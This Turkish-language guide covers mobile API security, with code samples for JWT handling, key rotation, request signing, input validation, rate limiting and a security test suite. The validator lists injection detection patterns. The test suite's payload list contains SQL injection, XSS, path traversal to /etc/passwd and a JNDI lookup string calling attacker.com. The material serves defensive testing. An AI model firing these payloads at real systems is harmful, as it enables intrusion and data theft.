# API Güvenliği

Mobil uygulamalarda API güvenliği, mobil istemciler ile arka uç servisler arasındaki iletişimin korunmasını içerir. Bu; API uç noktalarının güvenliğini sağlamak, uygun kimlik doğrulama mekanizmalarını uygulamak, yaygın saldırılara karşı koruma sağlamak ve iletim sırasında veri bütünlüğünü garanti altına almak anlamına gelir.

## API Güvenlik Mimarisi

## Kimlik Doğrulama ve Yetkilendirme

### JWT Token Uygulaması

```kotlin
// Android JWT Token Manager
class JWTTokenManager {
    private val secureStorage = SecureStorageManager()
    
    data class TokenPair(
        val accessToken: String,
        val refreshToken: String,
        val expiresAt: Long
    )
    
    suspend fun storeTokens(tokens: TokenPair) {
        secureStorage.storeSecurely("access_token", tokens.accessToken)
        secureStorage.storeSecurely("refresh_token", tokens.refreshToken)
        secureStorage.storeSecurely("token_expires_at", tokens.expiresAt.toString())
    }
    
    suspend fun getValidAccessToken(): String? {
        val accessToken = secureStorage.getSecurely("access_token")
        val expiresAt = secureStorage.getSecurely("token_expires_at")?.toLongOrNull()
        
        if (accessToken == null || expiresAt == null) {
            return null
        }
        
        // Check if token is about to expire (5 minutes buffer)
        if (System.currentTimeMillis() + 300_000 > expiresAt) {
            return refreshAccessToken()
        }
        
        return accessToken
    }
    
    private suspend fun refreshAccessToken(): String? {
        val refreshToken = secureStorage.getSecurely("refresh_token") ?: return null
        
        return try {
            val response = apiService.refreshToken(RefreshTokenRequest(refreshToken))
            storeTokens(TokenPair(
                accessToken = response.accessToken,
                refreshToken = response.refreshToken,
                expiresAt = response.expiresAt
            ))
            response.accessToken
        } catch (e: Exception) {
            // Refresh failed, clear tokens
            clearTokens()
            null
        }
    }
    
    suspend fun clearTokens() {
        secureStorage.removeSecurely("access_token")
        secureStorage.removeSecurely("refresh_token")
        secureStorage.removeSecurely("token_expires_at")
    }
}
```

### API Anahtarı Yönetimi

```swift
// iOS API Key Security
class APIKeyManager {
    private let keychain = KeychainManager()
    
    enum APIKeyType {
        case development
        case staging
        case production
    }
    
    func getAPIKey(for type: APIKeyType) -> String? {
        let keyName = getKeyName(for: type)
        return keychain.retrieve(forKey: keyName)
    }
    
    func rotateAPIKey(for type: APIKeyType, newKey: String) throws {
        let keyName = getKeyName(for: type)
        let oldKey = keychain.retrieve(forKey: keyName)
        
        // Store new key
        guard keychain.store(data: newKey.data(using: .utf8)!, forKey: keyName) else {
            throw APIKeyError.storageError
        }
        
        // Verify new key works
        guard try verifyAPIKey(newKey) else {
            // Rollback to old key if verification fails
            if let oldKey = oldKey {
                _ = keychain.store(data: oldKey, forKey: keyName)
            }
            throw APIKeyError.verificationFailed
        }
        
        // Log key rotation
        SecurityLogger.logAPIKeyRotation(type: type)
    }
    
    private func getKeyName(for type: APIKeyType) -> String {
        switch type {
        case .development:
            return "api_key_dev"
        case .staging:
            return "api_key_staging"
        case .production:
            return "api_key_prod"
        }
    }
    
    private func verifyAPIKey(_ apiKey: String) throws -> Bool {
        // Implement API key verification logic
        let request = URLRequest.verificationRequest(apiKey: apiKey)
        // ... verification implementation
        return true
    }
}
```

## İstek Güvenliği

### İstek İmzalama

```typescript
// React Native Request Signing
import CryptoJS from 'crypto-js';

class RequestSigner {
    private readonly secretKey: string;
    
    constructor(secretKey: string) {
        this.secretKey = secretKey;
    }
    
    signRequest(
        method: string,
        url: string,
        body?: any,
        timestamp?: number
    ): RequestSignature {
        const ts = timestamp || Date.now();
        const nonce = this.generateNonce();
        
        // Create canonical request
        const canonicalRequest = this.createCanonicalRequest(
            method,
            url,
            body,
            ts,
            nonce
        );
        
        // Generate signature
        const signature = CryptoJS.HmacSHA256(canonicalRequest, this.secretKey).toString();
        
        return {
            timestamp: ts,
            nonce,
            signature
        };
    }
    
    private createCanonicalRequest(
        method: string,
        url: string,
        body: any,
        timestamp: number,
        nonce: string
    ): string {
        const parsedUrl = new URL(url);
        const path = parsedUrl.pathname;
        const query = parsedUrl.search;
        
        const bodyHash = body 
            ? CryptoJS.SHA256(JSON.stringify(body)).toString()
            : CryptoJS.SHA256('').toString();
        
        return [
            method.toUpperCase(),
            path,
            query,
            bodyHash,
            timestamp.toString(),
            nonce
        ].join('\n');
    }
    
    private generateNonce(): string {
        return CryptoJS.lib.WordArray.random(32).toString();
    }
    
    verifyResponse(response: any, expectedSignature: string): boolean {
        const responseBody = JSON.stringify(response);
        const computedSignature = CryptoJS.HmacSHA256(responseBody, this.secretKey).toString();
        return computedSignature === expectedSignature;
    }
}

interface RequestSignature {
    timestamp: number;
    nonce: string;
    signature: string;
}
```

### Girdi Doğrulama ve Temizleme

```dart
// Flutter Input Validation
class APIInputValidator {
  static const int MAX_STRING_LENGTH = 1000;
  static const int MAX_ARRAY_SIZE = 100;
  
  ValidationResult validateUserInput(Map<String, dynamic> input) {
    final errors = <String>[];
    
    // Validate each field
    input.forEach((key, value) {
      final fieldErrors = validateField(key, value);
      errors.addAll(fieldErrors);
    });
    
    // Check for injection attacks
    final injectionErrors = checkForInjectionAttacks(input);
    errors.addAll(injectionErrors);
    
    return ValidationResult(
      isValid: errors.isEmpty,
      errors: errors,
      sanitizedInput: sanitizeInput(input)
    );
  }
  
  List<String> validateField(String fieldName, dynamic value) {
    final errors = <String>[];
    
    switch (fieldName) {
      case 'email':
        if (!_isValidEmail(value)) {
          errors.add('Geçersiz email formatı');
        }
        break;
      case 'phoneNumber':
        if (!_isValidPhoneNumber(value)) {
          errors.add('Geçersiz telefon numarası formatı');
        }
        break;
      case 'password':
        if (!_isValidPassword(value)) {
          errors.add('Şifre güvenlik gereksinimlerini karşılamıyor');
        }
        break;
    }
    
    // Common validations
    if (value is String) {
      if (value.length > MAX_STRING_LENGTH) {
        errors.add('$fieldName maksimum uzunluğu aşıyor');
      }
      if (value.trim().isEmpty) {
        errors.add('$fieldName boş olamaz');
      }
    }
    
    if (value is List && value.length > MAX_ARRAY_SIZE) {
      errors.add('$fieldName dizisi maksimum boyutu aşıyor');
    }
    
    return errors;
  }
  
  List<String> checkForInjectionAttacks(Map<String, dynamic> input) {
    final errors = <String>[];
    final maliciousPatterns = [
      RegExp(r'<script[\s\S]*?</script>', caseSensitive: false),
      RegExp(r'javascript:', caseSensitive: false),
      RegExp(r'on\w+\s*=', caseSensitive: false),
      RegExp(r'union\s+select', caseSensitive: false),
      RegExp(r'drop\s+table', caseSensitive: false),
      RegExp(r'exec\s*\(', caseSensitive: false),
    ];
    
    input.forEach((key, value) {
      if (value is String) {
        for (final pattern in maliciousPatterns) {
          if (pattern.hasMatch(value)) {
            errors.add('Potansiyel olarak zararlı içerik $key alanında tespit edildi');
            break;
          }
        }
      }
    });
    
    return errors;
  }
  
  Map<String, dynamic> sanitizeInput(Map<String, dynamic> input) {
    final sanitized = <String, dynamic>{};
    
    input.forEach((key, value) {
      if (value is String) {
        sanitized[key] = _sanitizeString(value);
      } else if (value is List) {
        sanitized[key] = value.take(MAX_ARRAY_SIZE).toList();
      } else {
        sanitized[key] = value;
      }
    });
    
    return sanitized;
  }
  
  String _sanitizeString(String input) {
    return input
        .replaceAll(RegExp(r'<[^>]*>'), '') // Remove HTML tags
        .replaceAll(RegExp(r'[<>&"\']'), '') // Remove dangerous characters
        .trim()
        .substring(0, input.length.clamp(0, MAX_STRING_LENGTH));
  }
  
  bool _isValidEmail(String? email) {
    if (email == null) return false;
    return RegExp(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$')
        .hasMatch(email);
  }
  
  bool _isValidPhoneNumber(String? phone) {
    if (phone == null) return false;
    return RegExp(r'^\+?[1-9]\d{1,14}$').hasMatch(phone);
  }
  
  bool _isValidPassword(String? password) {
    if (password == null || password.length < 8) return false;
    
    return RegExp(r'^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]')
        .hasMatch(password);
  }
}

class ValidationResult {
  final bool isValid;
  final List<String> errors;
  final Map<String, dynamic> sanitizedInput;
  
  ValidationResult({
    required this.isValid,
    required this.errors,
    required this.sanitizedInput,
  });
}
```

## Oran Sınırlama ve DDoS Koruması

### İstemci Tarafı Oran Sınırlama

```kotlin
class ClientRateLimiter {
    private val requestCounts = mutableMapOf<String, RequestCounter>()
    private val rateLimits = mapOf(
        "auth" to RateLimit(maxRequests = 5, windowMs = 60_000), // 5 per minute
        "api" to RateLimit(maxRequests = 100, windowMs = 60_000), // 100 per minute
        "upload" to RateLimit(maxRequests = 10, windowMs = 300_000) // 10 per 5 minutes
    )
    
    data class RateLimit(val maxRequests: Int, val windowMs: Long)
    data class RequestCounter(var count: Int, var windowStart: Long)
    
    suspend fun checkRateLimit(endpoint: String): RateLimitResult {
        val category = categorizeEndpoint(endpoint)
        val limit = rateLimits[category] ?: return RateLimitResult.Allowed
        
        val now = System.currentTimeMillis()
        val counter = requestCounts.getOrPut(category) { 
            RequestCounter(0, now) 
        }
        
        // Reset window if expired
        if (now - counter.windowStart > limit.windowMs) {
            counter.count = 0
            counter.windowStart = now
        }
        
        // Check if limit exceeded
        if (counter.count >= limit.maxRequests) {
            val resetTime = counter.windowStart + limit.windowMs
            return RateLimitResult.Exceeded(resetTime)
        }
        
        // Increment counter
        counter.count++
        return RateLimitResult.Allowed
    }
    
    private fun categorizeEndpoint(endpoint: String): String {
        return when {
            endpoint.contains("/auth/") -> "auth"
            endpoint.contains("/upload/") -> "upload"
            else -> "api"
        }
    }
    
    sealed class RateLimitResult {
        object Allowed : RateLimitResult()
        data class Exceeded(val resetTime: Long) : RateLimitResult()
    }
}
```

## Hata Yönetimi ve Güvenliği

### Güvenli Hata Yanıtları

```swift
class SecureErrorHandler {
    enum APIError: Error {
        case invalidCredentials
        case insufficientPermissions
        case rateLimitExceeded(retryAfter: TimeInterval)
        case validationError(fields: [String])
        case serverError
        case networkError
        case unknownError
    }
    
    func handleAPIError(_ error: Error) -> UserFacingError {
        switch error {
        case APIError.invalidCredentials:
            return UserFacingError(
                message: "Geçersiz giriş bilgileri",
                code: "AUTH_001",
                shouldRetry: false
            )
            
        case APIError.insufficientPermissions:
            return UserFacingError(
                message: "Bu işlemi gerçekleştirmek için izniniz yok",
                code: "AUTH_002",
                shouldRetry: false
            )
            
        case APIError.rateLimitExceeded(let retryAfter):
            return UserFacingError(
                message: "Çok fazla istek gönderdiniz. Lütfen daha sonra tekrar deneyin",
                code: "RATE_001",
                shouldRetry: true,
                retryAfter: retryAfter
            )
            
        case APIError.validationError(let fields):
            return UserFacingError(
                message: "Lütfen girdilerinizi kontrol edin: \(fields.joined(separator: ", "))",
                code: "VALIDATION_001",
                shouldRetry: false
            )
            
        case APIError.serverError:
            // Log error details internally but don't expose to user
            SecurityLogger.logServerError(error)
            return UserFacingError(
                message: "Bir şeyler ters gitti. Lütfen tekrar deneyin",
                code: "SERVER_001",
                shouldRetry: true
            )
            
        default:
            SecurityLogger.logUnknownError(error)
            return UserFacingError(
                message: "Beklenmedik bir hata oluştu",
                code: "UNKNOWN_001",
                shouldRetry: true
            )
        }
    }
    
    struct UserFacingError {
        let message: String
        let code: String
        let shouldRetry: Bool
        let retryAfter: TimeInterval?
        
        init(message: String, code: String, shouldRetry: Bool, retryAfter: TimeInterval? = nil) {
            self.message = message
            self.code = code
            self.shouldRetry = shouldRetry
            self.retryAfter = retryAfter
        }
    }
}
```

## API Güvenliği Testi

### Güvenlik Testi Uygulaması

```typescript
// API Security Test Suite
class APISecurityTester {
    constructor(private baseUrl: string, private apiKey: string) {}
    
    async runSecurityTests(): Promise<SecurityTestResults> {
        const results: SecurityTestResults = {
            passed: 0,
            failed: 0,
            tests: []
        };
        
        // Test authentication bypass
        await this.testAuthenticationBypass(results);
        
        // Test injection attacks
        await this.testInjectionAttacks(results);
        
        // Test rate limiting
        await this.testRateLimiting(results);
        
        // Test data exposure
        await this.testDataExposure(results);
        
        return results;
    }
    
    private async testAuthenticationBypass(results: SecurityTestResults) {
        const testCases = [
            { name: 'No token provided', headers: {} },
            { name: 'Invalid token', headers: { 'Authorization': 'Bearer invalid-token' } },
            { name: 'Expired token', headers: { 'Authorization': 'Bearer expired-token' } },
            { name: 'Malformed token', headers: { 'Authorization': 'Malformed token' } }
        ];
        
        for (const testCase of testCases) {
            try {
                const response = await fetch(`${this.baseUrl}/protected-endpoint`, {
                    headers: testCase.headers
                });
                
                if (response.status === 401 || response.status === 403) {
                    results.passed++;
                    results.tests.push({
                        name: `Auth Bypass: ${testCase.name}`,
                        status: 'PASSED',
                        details: 'Properly rejected unauthorized request'
                    });
                } else {
                    results.failed++;
                    results.tests.push({
                        name: `Auth Bypass: ${testCase.name}`,
                        status: 'FAILED',
                        details: `Expected 401/403, got ${response.status}`
                    });
                }
            } catch (error) {
                results.failed++;
                results.tests.push({
                    name: `Auth Bypass: ${testCase.name}`,
                    status: 'ERROR',
                    details: `Test failed with error: ${error}`
                });
            }
        }
    }
    
    private async testInjectionAttacks(results: SecurityTestResults) {
        const injectionPayloads = [
            "'; DROP TABLE users; --",
            "<script>alert('XSS')</script>",
            "../../etc/passwd",
            "${jndi:ldap://attacker.com/exploit}",
            "{{7*7}}"
        ];
        
        for (const payload of injectionPayloads) {
            try {
                const response = await fetch(`${this.baseUrl}/search`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Authorization': `Bearer ${this.apiKey}`
                    },
                    body: JSON.stringify({ query: payload })
                });
                
                const responseText = await response.text();
                
                if (responseText.includes(payload) && !response.ok) {
                    results.passed++;
                    results.tests.push({
                        name: `Injection Test: ${payload.substring(0, 20)}...`,
                        status: 'PASSED',
                        details: 'Injection attempt properly handled'
                    });
                } else if (responseText.includes(payload)) {
                    results.failed++;
                    results.tests.push({
                        name: `Injection Test: ${payload.substring(0, 20)}...`,
                        status: 'FAILED',
                        details: 'Injection payload reflected in response'
                    });
                }
            } catch (error) {
                // Network errors are acceptable for injection tests
                results.passed++;
                results.tests.push({
                    name: `Injection Test: ${payload.substring(0, 20)}...`,
                    status: 'PASSED',
                    details: 'Request properly rejected'
                });
            }
        }
    }
    
    private async testRateLimiting(results: SecurityTestResults) {
        const requestCount = 100;
        const promises: Promise<Response>[] = [];
        
        // Send many requests simultaneously
        for (let i = 0; i < requestCount; i++) {
            promises.push(
                fetch(`${this.baseUrl}/api/test`, {
                    headers: { 'Authorization': `Bearer ${this.apiKey}` }
                })
            );
        }
        
        const responses = await Promise.allSettled(promises);
        const rateLimitedResponses = responses.filter(
            result => result.status === 'fulfilled' && 
                     result.value.status === 429
        );
        
        if (rateLimitedResponses.length > 0) {
            results.passed++;
            results.tests.push({
                name: 'Rate Limiting Test',
                status: 'PASSED',
                details: `${rateLimitedResponses.length} requests were rate limited`
            });
        } else {
            results.failed++;
            results.tests.push({
                name: 'Rate Limiting Test',
                status: 'FAILED',
                details: 'No rate limiting detected'
            });
        }
    }
    
    private async testDataExposure(results: SecurityTestResults) {
        const sensitivePatterns = [
            /password/i,
            /secret/i,
            /key/i,
            /token/i,
            /\b\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}\b/, // Credit card
            /\b\d{3}-\d{2}-\d{4}\b/ // SSN
        ];
        
        try {
            const response = await fetch(`${this.baseUrl}/api/user/profile`, {
                headers: { 'Authorization': `Bearer ${this.apiKey}` }
            });
            
            const responseText = await response.text();
            const exposedData: string[] = [];
            
            sensitivePatterns.forEach(pattern => {
                if (pattern.test(responseText)) {
                    exposedData.push(pattern.toString());
                }
            });
            
            if (exposedData.length === 0) {
                results.passed++;
                results.tests.push({
                    name: 'Data Exposure Test',
                    status: 'PASSED',
                    details: 'No sensitive data patterns detected'
                });
            } else {
                results.failed++;
                results.tests.push({
                    name: 'Data Exposure Test',
                    status: 'FAILED',
                    details: `Sensitive patterns detected: ${exposedData.join(', ')}`
                });
            }
        } catch (error) {
            results.failed++;
            results.tests.push({
                name: 'Data Exposure Test',
                status: 'ERROR',
                details: `Test failed: ${error}`
            });
        }
    }
}

interface SecurityTestResults {
    passed: number;
    failed: number;
    tests: SecurityTestCase[];
}

interface SecurityTestCase {
    name: string;
    status: 'PASSED' | 'FAILED' | 'ERROR';
    details: string;
}
```

## En İyi Uygulamalar

### API Güvenliği Kontrol Listesi

- [ ] **Kimlik Doğrulama ve Yetkilendirme**
  - Mobil uygulamalar için OAuth 2.0 ve PKCE uygulayın
  - Kısa ömürlü erişim tokenları ve yenileme tokenları kullanın
  - Her istekte tokenları doğrulayın
  - Uygun kapsam tabanlı yetkilendirmeyi uygulayın

- [ ] **Girdi Doğrulama**
  - Tüm girdi parametrelerini sunucu tarafında doğrulayın
  - İstek boyutu sınırlamaları uygulayın
  - Enjeksiyon saldırılarına karşı koruma için girdileri temizleyin
  - Girdi doğrulaması için izin verilen listeler (allow-lists) kullanın

- [ ] **Oran Sınırlama (Rate Limiting)**
  - Kullanıcı başına ve global oran sınırlamaları uygula
  - Kayan pencere algoritmaları kullan
  - Uygun HTTP durum kodlarını döndür (429)
  - İstemci tarafı oran sınırlaması uygula

- [ ] **Hata Yönetimi**
  - Hatalarda hassas bilgileri gösterme
  - Tutarlı hata yanıt formatı kullan
  - İzleme için güvenlik olaylarını logla
  - Uygun HTTP durum kodlarını uygula

- [ ] **Taşıma Güvenliği (Transport Security)**
  - Tüm iletişimlerde TLS 1.3 kullan
  - Sertifika sabitleme (certificate pinning) uygula
  - SSL sertifikalarını doğru şekilde doğrula
  - HSTS başlıkları kullan

- [ ] **İzleme ve Kayıt (Monitoring & Logging)**
  - Tüm kimlik doğrulama olaylarını logla
  - Şüpheli kalıpları izle
  - Gerçek zamanlı uyarı sistemi uygula
  - Düzenli güvenlik denetimleri yap

API güvenliği, ortaya çıkan tehditlere sürekli dikkat, düzenli güvenlik değerlendirmeleri ve savunma mekanizmalarının proaktif olarak uygulanmasını gerektiren sürekli bir süreçtir. Bu desenlerin doğru uygulanması, saldırı yüzeyini önemli ölçüde azaltır ve hassas kullanıcı verilerini korur.
